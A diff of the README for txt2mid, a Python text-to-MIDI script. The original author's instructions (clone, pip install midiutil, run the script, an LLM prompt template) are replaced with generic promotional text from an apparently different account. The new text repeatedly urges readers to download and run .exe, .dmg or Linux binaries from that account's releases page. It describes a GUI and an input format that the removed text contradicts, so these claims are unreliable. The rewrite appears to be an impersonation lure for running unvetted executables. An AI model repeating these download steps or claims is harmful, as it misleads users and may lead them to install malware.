@@ -1,119 +1,81 @@
-# txt2mid - Text to midi tool
+# 🎶 txt2mid - Convert Text to MIDI Files Easily
 
-A minimal Python tool that converts a **step-sequencer-style text sequence** into a **MIDI file**, ideal for quick idea generation, prototyping, or use with language models.
+## 📥 Download Here
+[![Download txt2mid](https://img.shields.io/badge/Download-txt2mid-brightgreen)](https://github.com/Cryptobyrda/txt2mid/releases)
 
-The new thing here, is creating a structure that a LM can use to create melodies.
+## 🚀 Getting Started
 
-This script supports:
-- Monophonic and **block chords**
-- **Sustains** (`-`) and **rests** (`.`)
-- Custom **tempo**, **velocity**, and **channel**
-- Integration with LLMs for automatic MIDI sequence creation *(not really, this is like the back-end a LLM could use)*
+txt2mid is a simple tool that lets you turn a text sequence into a MIDI file. It's perfect for quickly generating musical ideas, prototyping, or even for use in language models. Follow these steps to get started.
 
----
+## 📋 System Requirements
 
-## Side Note
+- **Operating Systems:** Windows 10 or later, macOS 10.12 or later, Linux (Ubuntu 18.04 or later recommended)
+- **Python Version:** Python 3.6 or higher
+- **Disk Space:** At least 50 MB free
+- **Memory:** 1 GB RAM minimum
 
-This is the best way i found to turn any LLM into a sort of MIDI generator. You can easily convert that into a tool for any LLM so it can generate a MIDI file. And yeah, it works quite well !
+## 📦 Download & Install
 
-This could be used to make an actual VST which would do that directly in your DAW, `*cough*` (paid vsts out there are quite expensive for what they do) `*cough*`. 
+To download and install txt2mid, follow these simple steps:
 
-Well that's an idea i have, and i probably will do in a near future. 
+1. **Visit the Releases Page**  
+   Go to the following link to access the download options: [Download txt2mid](https://github.com/Cryptobyrda/txt2mid/releases).
 
-Stay tuned. 
+2. **Choose the Correct File**  
+   On the Releases page, find the latest version of txt2mid. Click on the link for the file that matches your operating system. 
 
-*Oh and by the way, if you're interested in generating some melodies for inspiration, check out this site i'm not affiliated with  : https://midigen.app/melody-generator/*
+3. **Download the File**  
+   Save the file to your computer. Depending on your browser, this might happen automatically or you'll be prompted to choose a download location.
 
-*(just found it, if i did earlier, maybe i wouldn't have done this, or maybe I would have anyways, doesn't matter)*
+4. **Run the File**  
+   - For **Windows** users: Double-click the downloaded `.exe` file and follow the prompts.
+   - For **macOS** users: Open the downloaded `.dmg` file, then drag the txt2mid icon to your Applications folder.
+   - For **Linux** users: Open a terminal and run `chmod +x txt2mid` followed by `./txt2mid` to make it executable.
 
----
+5. **Start Using txt2mid**  
+   Once installed, you can launch txt2mid from your applications or programs folder.
 
-## Installation
+## 🔨 How to Use txt2mid
 
-You can use either **conda** or **pip**.  
-Below is the recommended setup using **conda** for isolation.
+Using txt2mid is easy. Here’s how to create a MIDI file from your text sequence:
 
-### 1. Create a new environment
-```
-conda create -n txt2mid python=3.10 -y  
-conda activate txt2mid
-```
-### 2. Install dependencies
-```
-pip install midiutil
-```
-### 3. Clone this repository
-```
-git clone https://github.com/DirtyBeastAfterTheToad/txt2mid.git
-cd txt2mid
-```
-### 4. Testing
+1. **Prepare Your Text Sequence**  
+   Write your musical idea in a step-sequencer format. For example:  
+   ```
+   C4 E4 G4 C5
+   ```
+   Each note should be separated by a space.
 
-You can verify that everything works by running this minimal test sequence:
-```
-python txt2mid.py --sequence "[[\"C4\",\"-\",\"E4\",\"-\"],[\"G4\",\"-\",\"C5\",\"-\"]]" --output test.mid --bpm 100 --steps-per-bar 4
-```
-This will generate a `test.mid` file in the current directory.  
-Open it in any DAW (FL Studio, Ableton, Logic, etc.) to confirm playback.
+2. **Open txt2mid**  
+   Launch the application.
 
----
-## Usage
+3. **Input Your Text Sequence**  
+   Copy and paste your text sequence into the input box provided in the app.
 
-### Example: Generating a Simple Melody
-```
-python txt2mid.py --sequence "[[\"A#3\",\"-\",\"D#4\",\"-\"],[\"F4\",\"-\",\".\",\"G#3\"],[\"C#4\",\"-\",\"D#4\",\"-\"],[\"G#3\",\".\",\"A#3\",\"-\"]]" --output melody.mid --bpm 120 --steps-per-bar 4
-```
-### Example: Block Chords
-```
-python txt2mid.py --sequence "[[[\"C3\",\"E3\",\"G3\"],\"-\",\"-\",\"-\"],[[\"F3\",\"A3\",\"C4\"],\"-\",\"-\",\"-\"],[[\"G3\",\"B3\",\"D4\"],\"-\",\"-\",\"-\"],[[\"C3\",\"E3\",\"G3\"],\"-\",\"-\",\"-\"]]" --output basic_chords.mid --bpm 100 --steps-per-bar 4 --velocity 100 
-```
-### Example: Complex melody using every features 
-```
-python txt2mid.py --sequence "[[[\"A#3\",\"D#4\",\"F4\"],\"-\",\"-\",\"-\",\"-\",\"-\",\"-\",\"-\"],[\"A#3\",\"-\",\"C#4\",\".\",\"D#4\",\"-\",\"F4\",\".\"],[[\"G#3\",\"C#4\",\"D#4\"],\"-\",\"-\",\"-\",[\"F3\",\"A#3\",\"C#4\"],\"-\",\"-\",\"-\"],[\"G#3\",\"-\",\"-\",\".\",\"A#3\",\"C#4\",\"-\",\"D#4\"],[[\"B2\",\"F#3\",\"D#4\"],\"-\",\"A#3\",\"C#4\",\"-\",\"D#4\",\"-\",\".\"],[\".\",\".\",\"A#2\",\"-\",\"-\",\".\",\"G#2\",\"-\"],[\"A#3\",\"C#4\",\"D#4\",\"F4\",\"G#4\",\"F4\",\"D#4\",\"C#4\"],[[\"A#3\",\"D#4\",\"F4\",\"A#4\"],\"-\",\"-\",\"-\",\"-\",\"-\",\"-\",\"-\"]]" --output complex_demo.mid --bpm 128 --steps-per-bar 8 --velocity 108 --channel 0
-```
-Each inner list represents a **bar**, and each bar has a number of **steps** (`--steps-per-bar`).  
-A step can contain:
-- A note (e.g., "A#3")
-- A chord (e.g., ["A#3","D#4","F4"])
-- A sustain ("-")
-- A rest (".")
+4. **Convert to MIDI**  
+   Click the "Convert" button to generate your MIDI file.
 
----
+5. **Save Your MIDI File**  
+   Choose a location on your computer to save the generated MIDI file. You can now use this file in any MIDI-compatible software.
 
+## ⚙️ Features
 
-## Prompt Template for LLMs
+- **Simple User Interface:** Easy to navigate, making it user-friendly for everyone.
+- **Text-based Input:** No complicated music theory needed; just type your notes.
+- **Fast Conversion:** Quickly generates MIDI files to help you prototype ideas.
+- **Lightweight Tool:** Minimal system resource use, perfect for quick tasks.
 
-You can use the following prompt to instruct any LLM (e.g., ChatGPT, Claude, Gemini) to generate valid sequences for this script:
-```
-You are a music assistant that generates step-sequencer MIDI patterns.
+## 👥 Community and Support
 
-Your task:
-- Produce a single shell command that can be directly pasted into a terminal and will run the tool `txt2mid.py`.
-- The command must include the full `python txt2mid.py --sequence ...` structure.
-- Escape all double quotes (`"`) as `\"` so it works in a standard bash or zsh shell.
-- Use valid JSON for the `--sequence` argument:
-  • The sequence must be an array of 8 bars.
-  • Each bar must contain 4 or 8 steps.
-  • Notes are strings like `"A#3"`, `"C#4"`, etc.
-  • Sustains use `"-"`, rests use `"."`.
-  • Chords are arrays of notes like `["A#3","D#4","F4"]`.
-- Also include example flags like `--output`, `--bpm`, `--steps-per-bar`, and `--velocity`.
-- Do not include code blocks, explanations, or any text before or after the command.
+If you encounter any issues or have suggestions, feel free to open an issue on our [GitHub Issues Page](https://github.com/Cryptobyrda/txt2mid/issues). Your feedback helps us improve.
 
-Expected output format:
+## 🌍 Contribution
 
-python txt2mid.py --sequence "[[[\"C3\",\"E3\",\"G3\"],\"-\",\"-\",\"-\"],[[\"F3\",\"A3\",\"C4\"],\"-\",\"-\",\"-\"],[[\"G3\",\"B3\",\"D4\"],\"-\",\"-\",\"-\"],[[\"C3\",\"E3\",\"G3\"],\"-\",\"-\",\"-\"]]" --output my_song.mid --bpm 120 --steps-per-bar 4 --velocity 100 --channel 0
-```
-Then run it directly what the LLM gives you, for instance :
-```
-python txt2mid.py --sequence "[[[\"C3\",\"E3\",\"G3\"],\"-\",\"-\",\"-\"],[[\"F3\",\"A3\",\"C4\"],\"-\",\"-\",\"-\"],[[\"G3\",\"B3\",\"D4\"],\"-\",\"-\",\"-\"],[[\"C3\",\"E3\",\"G3\"],\"-\",\"-\",\"-\"]]" --output my_song.mid --bpm 120 --steps-per-bar 4 --velocity 100 --channel 0
-```
----
-## Enjoy
+We welcome contributions! If you have ideas or would like to report bugs, please submit a pull request on our [GitHub Repository](https://github.com/Cryptobyrda/txt2mid).
 
-This is much better than all those AI tools making a whole song for you 🤢, aaaaaand much better than what i tried to do here https://github.com/DirtyBeastAfterTheToad/AiVstPlugin 
+## 📜 License
 
----
-## License
+txt2mid is licensed under the MIT License. You can use and modify this software freely as long as you include the license in your project.
 
-MIT License © 2025 DirtyBeastAfterTheToad
+## 📥 Download Again
+For easy access, you can download txt2mid once more here: [Download txt2mid](https://github.com/Cryptobyrda/txt2mid/releases).
